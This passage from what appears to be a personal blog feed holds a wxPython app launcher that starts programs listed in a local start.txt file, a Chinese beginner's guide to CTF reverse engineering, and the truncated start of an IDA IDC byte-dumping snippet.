class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">###########################################################################</span></span><br><span class="line"><span class="comment">## Python code generated with wxFormBuilder (version 3.10.1-0-g8feb16b3)</span></span><br><span class="line"><span class="comment">## http://www.wxformbuilder.org/</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">## PLEASE DO *NOT* EDIT THIS FILE!</span></span><br><span class="line"><span class="comment">###########################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> wx</span><br><span class="line"><span class="keyword">import</span> wx.xrc</span><br><span class="line"></span><br><span class="line"><span class="comment">###########################################################################</span></span><br><span class="line"><span class="comment">## Class mainFrame</span></span><br><span class="line"><span class="comment">###########################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">mainFrame</span> ( wx.Frame ):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"> self, parent </span>):</span><br><span class="line">        wx.Frame.__init__ ( self, parent, <span class="built_in">id</span> = wx.ID_ANY, title = <span class="string">u&quot;Start --1.0&quot;</span>, pos = wx.DefaultPosition, size = wx.Size( <span class="number">250</span>,<span class="number">600</span> ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL )</span><br><span class="line"></span><br><span class="line">        self.SetSizeHints( wx.DefaultSize, wx.DefaultSize )</span><br><span class="line"></span><br><span class="line">        sbSizer1 = wx.StaticBoxSizer( wx.StaticBox( self, wx.ID_ANY, wx.EmptyString ), wx.VERTICAL )</span><br><span class="line"></span><br><span class="line">        gSizer2 = wx.GridSizer( <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">        sbSizer4 = wx.StaticBoxSizer( wx.StaticBox( sbSizer1.GetStaticBox(), wx.ID_ANY, wx.EmptyString ), wx.VERTICAL )</span><br><span class="line"></span><br><span class="line">        self.m_checkBox10 = wx.CheckBox( sbSizer4.GetStaticBox(), wx.ID_ANY, name[<span class="number">0</span>][<span class="number">0</span>], wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</span><br><span class="line">        self.m_checkBox10.SetValue(<span class="literal">True</span>)</span><br><span class="line">        sbSizer4.Add( self.m_checkBox10, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        self.m_button2 = wx.Button( sbSizer4.GetStaticBox(), wx.ID_ANY, name[<span class="number">0</span>][<span class="number">0</span>], wx.DefaultPosition, wx.Size( <span class="number">120</span>,-<span class="number">1</span> ), <span class="number">0</span> )</span><br><span class="line">        sbSizer4.Add( self.m_button2, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        gSizer2.Add( sbSizer4, <span class="number">1</span>, wx.EXPAND, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        sbSizer41 = wx.StaticBoxSizer( wx.StaticBox( sbSizer1.GetStaticBox(), wx.ID_ANY, wx.EmptyString ), wx.VERTICAL )</span><br><span class="line"></span><br><span class="line">        self.m_checkBox11 = wx.CheckBox( sbSizer41.GetStaticBox(), wx.ID_ANY, name[<span class="number">1</span>][<span class="number">0</span>], wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</span><br><span class="line">        self.m_checkBox11.SetValue(<span class="literal">True</span>)</span><br><span class="line">        sbSizer41.Add( self.m_checkBox11, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        self.m_button21 = wx.Button( sbSizer41.GetStaticBox(), wx.ID_ANY, name[<span class="number">1</span>][<span class="number">0</span>], wx.DefaultPosition, wx.Size( <span class="number">120</span>,-<span class="number">1</span> ), <span class="number">0</span> )</span><br><span class="line">        sbSizer41.Add( self.m_button21, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        gSizer2.Add( sbSizer41, <span class="number">1</span>, wx.EXPAND, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        sbSizer42 = wx.StaticBoxSizer( wx.StaticBox( sbSizer1.GetStaticBox(), wx.ID_ANY, wx.EmptyString ), wx.VERTICAL )</span><br><span class="line"></span><br><span class="line">        self.m_checkBox12 = wx.CheckBox( sbSizer42.GetStaticBox(), wx.ID_ANY, name[<span class="number">2</span>][<span class="number">0</span>], wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</span><br><span class="line">        self.m_checkBox12.SetValue(<span class="literal">False</span>)</span><br><span class="line">        sbSizer42.Add( self.m_checkBox12, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        self.m_button22 = wx.Button( sbSizer42.GetStaticBox(), wx.ID_ANY, name[<span class="number">2</span>][<span class="number">0</span>], wx.DefaultPosition, wx.Size( <span class="number">120</span>,-<span class="number">1</span> ), <span class="number">0</span> )</span><br><span class="line">        sbSizer42.Add( self.m_button22, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        gSizer2.Add( sbSizer42, <span class="number">1</span>, wx.EXPAND, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        sbSizer43 = wx.StaticBoxSizer( wx.StaticBox( sbSizer1.GetStaticBox(), wx.ID_ANY, wx.EmptyString ), wx.VERTICAL )</span><br><span class="line"></span><br><span class="line">        self.m_checkBox13 = wx.CheckBox( sbSizer43.GetStaticBox(), wx.ID_ANY, name[<span class="number">3</span>][<span class="number">0</span>], wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</span><br><span class="line">        self.m_checkBox13.SetValue(<span class="literal">False</span>)</span><br><span class="line">        sbSizer43.Add( self.m_checkBox13, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        self.m_button23 = wx.Button( sbSizer43.GetStaticBox(), wx.ID_ANY, name[<span class="number">3</span>][<span class="number">0</span>], wx.DefaultPosition, wx.Size( <span class="number">120</span>,-<span class="number">1</span> ), <span class="number">0</span> )</span><br><span class="line">        sbSizer43.Add( self.m_button23, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        gSizer2.Add( sbSizer43, <span class="number">1</span>, wx.EXPAND, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        sbSizer44 = wx.StaticBoxSizer( wx.StaticBox( sbSizer1.GetStaticBox(), wx.ID_ANY, wx.EmptyString ), wx.VERTICAL )</span><br><span class="line"></span><br><span class="line">        self.m_checkBox14 = wx.CheckBox( sbSizer44.GetStaticBox(), wx.ID_ANY, name[<span class="number">4</span>][<span class="number">0</span>], wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</span><br><span class="line">        self.m_checkBox14.SetValue(<span class="literal">True</span>)</span><br><span class="line">        sbSizer44.Add( self.m_checkBox14, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        self.m_button24 = wx.Button( sbSizer44.GetStaticBox(), wx.ID_ANY, name[<span class="number">4</span>][<span class="number">0</span>], wx.DefaultPosition, wx.Size( <span class="number">120</span>,-<span class="number">1</span> ), <span class="number">0</span> )</span><br><span class="line">        sbSizer44.Add( self.m_button24, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        gSizer2.Add( sbSizer44, <span class="number">1</span>, wx.EXPAND, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        sbSizer45 = wx.StaticBoxSizer( wx.StaticBox( sbSizer1.GetStaticBox(), wx.ID_ANY, wx.EmptyString ), wx.VERTICAL )</span><br><span class="line"></span><br><span class="line">        self.m_checkBox15 = wx.CheckBox( sbSizer45.GetStaticBox(), wx.ID_ANY, name[<span class="number">5</span>][<span class="number">0</span>], wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</span><br><span class="line">        self.m_checkBox15.SetValue(<span class="literal">True</span>)</span><br><span class="line">        sbSizer45.Add( self.m_checkBox15, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        self.m_button25 = wx.Button( sbSizer45.GetStaticBox(), wx.ID_ANY, name[<span class="number">5</span>][<span class="number">0</span>], wx.DefaultPosition, wx.Size( <span class="number">120</span>,-<span class="number">1</span> ), <span class="number">0</span> )</span><br><span class="line">        sbSizer45.Add( self.m_button25, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        gSizer2.Add( sbSizer45, <span class="number">1</span>, wx.EXPAND, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        sbSizer46 = wx.StaticBoxSizer( wx.StaticBox( sbSizer1.GetStaticBox(), wx.ID_ANY, wx.EmptyString ), wx.VERTICAL )</span><br><span class="line"></span><br><span class="line">        self.m_checkBox16 = wx.CheckBox( sbSizer46.GetStaticBox(), wx.ID_ANY, name[<span class="number">6</span>][<span class="number">0</span>], wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</span><br><span class="line">        self.m_checkBox16.SetValue(<span class="literal">False</span>)</span><br><span class="line">        sbSizer46.Add( self.m_checkBox16, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        self.m_button26 = wx.Button( sbSizer46.GetStaticBox(), wx.ID_ANY, name[<span class="number">6</span>][<span class="number">0</span>], wx.DefaultPosition, wx.Size( <span class="number">120</span>,-<span class="number">1</span> ), <span class="number">0</span> )</span><br><span class="line">        sbSizer46.Add( self.m_button26, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        gSizer2.Add( sbSizer46, <span class="number">1</span>, wx.EXPAND, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        sbSizer47 = wx.StaticBoxSizer( wx.StaticBox( sbSizer1.GetStaticBox(), wx.ID_ANY, wx.EmptyString ), wx.VERTICAL )</span><br><span class="line"></span><br><span class="line">        self.m_checkBox17 = wx.CheckBox( sbSizer47.GetStaticBox(), wx.ID_ANY, name[<span class="number">7</span>][<span class="number">0</span>], wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</span><br><span class="line">        self.m_checkBox17.SetValue(<span class="literal">True</span>)</span><br><span class="line">        sbSizer47.Add( self.m_checkBox17, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        self.m_button27 = wx.Button( sbSizer47.GetStaticBox(), wx.ID_ANY, name[<span class="number">7</span>][<span class="number">0</span>], wx.DefaultPosition, wx.Size( <span class="number">120</span>,-<span class="number">1</span> ), <span class="number">0</span> )</span><br><span class="line">        sbSizer47.Add( self.m_button27, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        gSizer2.Add( sbSizer47, <span class="number">1</span>, wx.EXPAND, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        sbSizer48 = wx.StaticBoxSizer( wx.StaticBox( sbSizer1.GetStaticBox(), wx.ID_ANY, wx.EmptyString ), wx.VERTICAL )</span><br><span class="line"></span><br><span class="line">        self.m_checkBox18 = wx.CheckBox( sbSizer48.GetStaticBox(), wx.ID_ANY, name[<span class="number">8</span>][<span class="number">0</span>], wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</span><br><span class="line">        self.m_checkBox18.SetValue(<span class="literal">True</span>)</span><br><span class="line">        sbSizer48.Add( self.m_checkBox18, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        self.m_button28 = wx.Button( sbSizer48.GetStaticBox(), wx.ID_ANY, name[<span class="number">8</span>][<span class="number">0</span>], wx.DefaultPosition, wx.Size( <span class="number">120</span>,-<span class="number">1</span> ), <span class="number">0</span> )</span><br><span class="line">        sbSizer48.Add( self.m_button28, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        gSizer2.Add( sbSizer48, <span class="number">1</span>, wx.EXPAND, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        sbSizer49 = wx.StaticBoxSizer( wx.StaticBox( sbSizer1.GetStaticBox(), wx.ID_ANY, wx.EmptyString ), wx.VERTICAL )</span><br><span class="line"></span><br><span class="line">        self.m_checkBox19 = wx.CheckBox( sbSizer49.GetStaticBox(), wx.ID_ANY, name[<span class="number">9</span>][<span class="number">0</span>], wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span> )</span><br><span class="line">        self.m_checkBox19.SetValue(<span class="literal">False</span>)</span><br><span class="line">        sbSizer49.Add( self.m_checkBox19, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        self.m_button29 = wx.Button( sbSizer49.GetStaticBox(), wx.ID_ANY, name[<span class="number">9</span>][<span class="number">0</span>], wx.DefaultPosition, wx.Size( <span class="number">120</span>,-<span class="number">1</span> ), <span class="number">0</span> )</span><br><span class="line">        sbSizer49.Add( self.m_button29, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        gSizer2.Add( sbSizer49, <span class="number">1</span>, wx.EXPAND, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        sbSizer410 = wx.StaticBoxSizer(wx.StaticBox(sbSizer1.GetStaticBox(), wx.ID_ANY, wx.EmptyString), wx.VERTICAL)</span><br><span class="line"></span><br><span class="line">        self.m_checkBox110 = wx.CheckBox(sbSizer410.GetStaticBox(), wx.ID_ANY, name[<span class="number">10</span>][<span class="number">0</span>], wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span>)</span><br><span class="line">        self.m_checkBox110.SetValue(<span class="literal">False</span>)</span><br><span class="line">        sbSizer410.Add(self.m_checkBox110, <span class="number">0</span>, wx.ALL, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        self.m_button210 = wx.Button(sbSizer410.GetStaticBox(), wx.ID_ANY, name[<span class="number">10</span>][<span class="number">0</span>], wx.DefaultPosition,wx.Size(<span class="number">120</span>, -<span class="number">1</span>), <span class="number">0</span>)</span><br><span class="line">        sbSizer410.Add(self.m_button210, <span class="number">0</span>, wx.ALL, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        gSizer2.Add(sbSizer410, <span class="number">1</span>, wx.EXPAND, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        sbSizer411 = wx.StaticBoxSizer(wx.StaticBox(sbSizer1.GetStaticBox(), wx.ID_ANY, wx.EmptyString), wx.VERTICAL)</span><br><span class="line"></span><br><span class="line">        self.m_checkBox111 = wx.CheckBox(sbSizer411.GetStaticBox(), wx.ID_ANY, name[<span class="number">11</span>][<span class="number">0</span>], wx.DefaultPosition, wx.DefaultSize, <span class="number">0</span>)</span><br><span class="line">        self.m_checkBox111.SetValue(<span class="literal">True</span>)</span><br><span class="line">        sbSizer411.Add(self.m_checkBox111, <span class="number">0</span>, wx.ALL, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        self.m_button211 = wx.Button(sbSizer411.GetStaticBox(), wx.ID_ANY, name[<span class="number">11</span>][<span class="number">0</span>], wx.DefaultPosition,</span><br><span class="line">                                     wx.Size(<span class="number">120</span>, -<span class="number">1</span>), <span class="number">0</span>)</span><br><span class="line">        sbSizer411.Add(self.m_button211, <span class="number">0</span>, wx.ALL, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        gSizer2.Add(sbSizer411, <span class="number">1</span>, wx.EXPAND, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        sbSizer1.Add( gSizer2, <span class="number">1</span>, wx.EXPAND, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line">        sbSizer3 = wx.StaticBoxSizer( wx.StaticBox( sbSizer1.GetStaticBox(), wx.ID_ANY, wx.EmptyString ), wx.VERTICAL )</span><br><span class="line"></span><br><span class="line">        self.Start = wx.Button( sbSizer3.GetStaticBox(), wx.ID_ANY, <span class="string">u&quot;Start&quot;</span>, wx.DefaultPosition, wx.Size( <span class="number">240</span>,-<span class="number">1</span> ), <span class="number">0</span> )</span><br><span class="line">        sbSizer3.Add( self.Start, <span class="number">0</span>, wx.ALL, <span class="number">5</span> )</span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># self.m_button20 = wx.Button( sbSizer3.GetStaticBox(), wx.ID_ANY, u&quot;MyButton&quot;, wx.DefaultPosition, wx.Size( 240,-1 ), 0 )</span></span><br><span class="line">        <span class="comment"># sbSizer3.Add( self.m_button20, 0, wx.ALL, 5 )</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># self.m_button211 = wx.Button( sbSizer3.GetStaticBox(), wx.ID_ANY, u&quot;MyButton&quot;, wx.DefaultPosition, wx.Size( 240,-1 ), 0 )</span></span><br><span class="line">        <span class="comment"># sbSizer3.Add( self.m_button211, 0, wx.ALL, 5 )</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># self.m_button221 = wx.Button( sbSizer3.GetStaticBox(), wx.ID_ANY, u&quot;MyButton&quot;, wx.DefaultPosition, wx.Size( 240,-1 ), 0 )</span></span><br><span class="line">        <span class="comment"># sbSizer3.Add( self.m_button221, 0, wx.ALL, 5 )</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        sbSizer1.Add( sbSizer3, <span class="number">1</span>, wx.EXPAND, <span class="number">5</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.SetSizer( sbSizer1 )</span><br><span class="line">        self.Layout()</span><br><span class="line"></span><br><span class="line">        self.Centre( wx.BOTH )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Connect Events</span></span><br><span class="line">        self.m_button2.Bind( wx.EVT_BUTTON, self.bu1 )</span><br><span class="line">        self.m_button21.Bind( wx.EVT_BUTTON, self.bu2 )</span><br><span class="line">        self.m_button22.Bind( wx.EVT_BUTTON, self.bu3 )</span><br><span class="line">        self.m_button23.Bind( wx.EVT_BUTTON, self.bu4 )</span><br><span class="line">        self.m_button24.Bind( wx.EVT_BUTTON, self.bu5 )</span><br><span class="line">        self.m_button25.Bind( wx.EVT_BUTTON, self.bu6 )</span><br><span class="line">        self.m_button26.Bind( wx.EVT_BUTTON, self.bu7 )</span><br><span class="line">        self.m_button27.Bind( wx.EVT_BUTTON, self.bu8 )</span><br><span class="line">        self.m_button28.Bind( wx.EVT_BUTTON, self.bu9 )</span><br><span class="line">        self.m_button29.Bind( wx.EVT_BUTTON, self.bu10 )</span><br><span class="line">        self.m_button210.Bind( wx.EVT_BUTTON, self.bu11 )</span><br><span class="line">        self.m_button211.Bind( wx.EVT_BUTTON, self.bu12 )</span><br><span class="line">        self.Start.Bind( wx.EVT_BUTTON, self.start )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params"> self </span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Virtual event handlers, override them in your derived class</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bu1</span>(<span class="params"> self, event </span>):</span><br><span class="line">        os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bu2</span>(<span class="params"> self, event </span>):</span><br><span class="line">        os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bu3</span>(<span class="params"> self, event </span>):</span><br><span class="line">        os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">2</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bu4</span>(<span class="params"> self, event </span>):</span><br><span class="line">        os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">3</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bu5</span>(<span class="params"> self, event </span>):</span><br><span class="line">        os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">4</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bu6</span>(<span class="params"> self, event </span>):</span><br><span class="line">        os.system(<span class="string">&quot;start %s&quot;</span> % name[<span class="number">5</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bu7</span>(<span class="params"> self, event </span>):</span><br><span class="line">        os.system(<span class="string">&quot;start %s&quot;</span> % name[<span class="number">6</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bu8</span>(<span class="params"> self, event </span>):</span><br><span class="line">        os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">7</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bu9</span>(<span class="params"> self, event </span>):</span><br><span class="line">        os.system(<span class="string">&quot;start %s&quot;</span> % name[<span class="number">8</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bu10</span>(<span class="params"> self, event </span>):</span><br><span class="line">        os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">9</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bu11</span>(<span class="params"> self, event </span>):</span><br><span class="line">        os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">10</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bu12</span>(<span class="params"> self, event </span>):</span><br><span class="line">        os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">11</span>][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># start selected application</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start</span>(<span class="params"> self, event </span>):</span><br><span class="line">        <span class="keyword">if</span> self.m_checkBox10.GetValue() == <span class="literal">True</span>:</span><br><span class="line">            os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> self.m_checkBox11.GetValue() == <span class="literal">True</span>:</span><br><span class="line">            os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> self.m_checkBox12.GetValue() == <span class="literal">True</span>:</span><br><span class="line">            os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">2</span>][<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> self.m_checkBox13.GetValue() == <span class="literal">True</span>:</span><br><span class="line">            os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">3</span>][<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> self.m_checkBox14.GetValue() == <span class="literal">True</span>:</span><br><span class="line">            os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">4</span>][<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> self.m_checkBox15.GetValue() == <span class="literal">True</span>:</span><br><span class="line">            os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">5</span>][<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> self.m_checkBox16.GetValue() == <span class="literal">True</span>:</span><br><span class="line">            os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">6</span>][<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> self.m_checkBox17.GetValue() == <span class="literal">True</span>:</span><br><span class="line">            os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">7</span>][<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> self.m_checkBox18.GetValue() == <span class="literal">True</span>:</span><br><span class="line">            os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">8</span>][<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> self.m_checkBox19.GetValue() == <span class="literal">True</span>:</span><br><span class="line">            os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">9</span>][<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> self.m_checkBox110.GetValue() == <span class="literal">True</span>:</span><br><span class="line">            os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">10</span>][<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> self.m_checkBox111.GetValue() == <span class="literal">True</span>:</span><br><span class="line">            os.system(<span class="string">&quot;start %s&quot;</span>%name[<span class="number">11</span>][<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    name = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;start.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>):</span><br><span class="line">        tmp = line.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        name.append(tmp)</span><br><span class="line">    app = wx.App(<span class="literal">False</span>)</span><br><span class="line">    frame = mainFrame(<span class="literal">None</span>)</span><br><span class="line">    frame.Show(<span class="literal">True</span>)</span><br><span class="line">    app.MainLoop()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Introduction</title>
      <link href="/2023/03/31/Introduction/"/>
      <url>/2023/03/31/Introduction/</url>
      
        <content type="html"><![CDATA[<ul><li>Reverse<span id="more"></span></li></ul><HR color="red"></HR><ul><li>浅谈一下逆向的入门</li></ul><hr><h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><ul><li>如果你是大一，那你可能会遇到一些麻烦，一下子接触这么多语言，接触这么多配置方式。</li><li>我只能说，不要急，慢慢来</li><li>你可以不会汇编，但是你不可以不会c语言</li></ul><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>你应该干什么？</p><ol><li><p>在展开正式学习之前，先试着去安装一个kali 和win10虚拟机，这是必要的</p></li><li><p>关于ctf-wiki，我们需要看，看一看逆向简介即可，剩余的如果你想看的话，可以看看目录</p></li><li><p>安装工具</p></li><li><p>开始学习</p><ol><li>学会使用工具(目的在于学会工具使用，而不是看懂代码)</li></ol><ul><li><p>exe文件执行与反编</p></li><li><p>elf文件执行与反编</p></li><li><p>jar文件执行与反编</p></li><li><p>pyc文件反编与编译运行</p></li><li><p>apk文件反编</p><blockquote><p>或许你不能完全的完成上面的事情，但这并不影响你继续后面的步骤</p></blockquote></li></ul><ol><li><p>了解一些常见的加密方式，tea，xtea，base64等等</p></li><li><p>python，java语言学习，先了解基本语法，此外，用python写一些简单的脚本（记住循序渐进）</p></li><li><p>汇编语言（功底越深越好）</p></li><li><p>看CTF-wiki，到这里你已经有了一些功底，是时候加深了解逆向了。浅浅接触一下花指令、加脱壳、反调试技术等等，你或许会发现自己看不懂，别急，看不懂的就是我们接下来要学习的</p></li><li><p>看过wiki之后，我想你明白了逆向有windows逆向，linux逆向，Android逆向，Ios逆向</p><blockquote><p>到这里，如果你在学习时同时刷了足够多的题，那我想你应该知道你接下来要做什么了</p></blockquote></li><li><p>尝试破解一些简单的软件之类(不要去违法)</p></li><li><p>刷题 &amp; 底层学习</p></li></ol></li></ol><h2 id="一些建议"><a href="#一些建议" class="headerlink" title="一些建议"></a>一些建议</h2><ul><li>逆向是一个需要代码能力较强的方向，最后你一定能够依靠的，是汇编，所以，学好汇编</li><li>多刷题，逆向要做的事就决定了他需要积攒足够的经验，因为你也不知道你下一秒遇到的软件是哪个奇葩开发的</li><li>多去论坛转悠转悠，会有帮助</li><li>不要执着于一个点，要学会取舍</li></ul><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>记住，能轻易完成的工作，也是最容易被替代的工作，我们要成为的，不是被替代的人。‘</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Script</title>
      <link href="/2023/03/31/Script/"/>
      <url>/2023/03/31/Script/</url>
      
        <content type="html"><![CDATA[<ul><li>Script<span id="more"></span></li></ul><HR color="red"></HR><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><h3 id="IDC爬数据"><a href="#IDC爬数据" class="headerlink" title="IDC爬数据"></a>IDC爬数据</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> addr = <span class="number">0x0000000100008000</span>;</span><br><span class="line"><span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i; i &lt; <span class="number">10</span>; i = i+<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Message</span>(<span class="string">&quot;%x&quot;</span>,<span class="built_in">Byte</span>(addr+i));</span><br><span 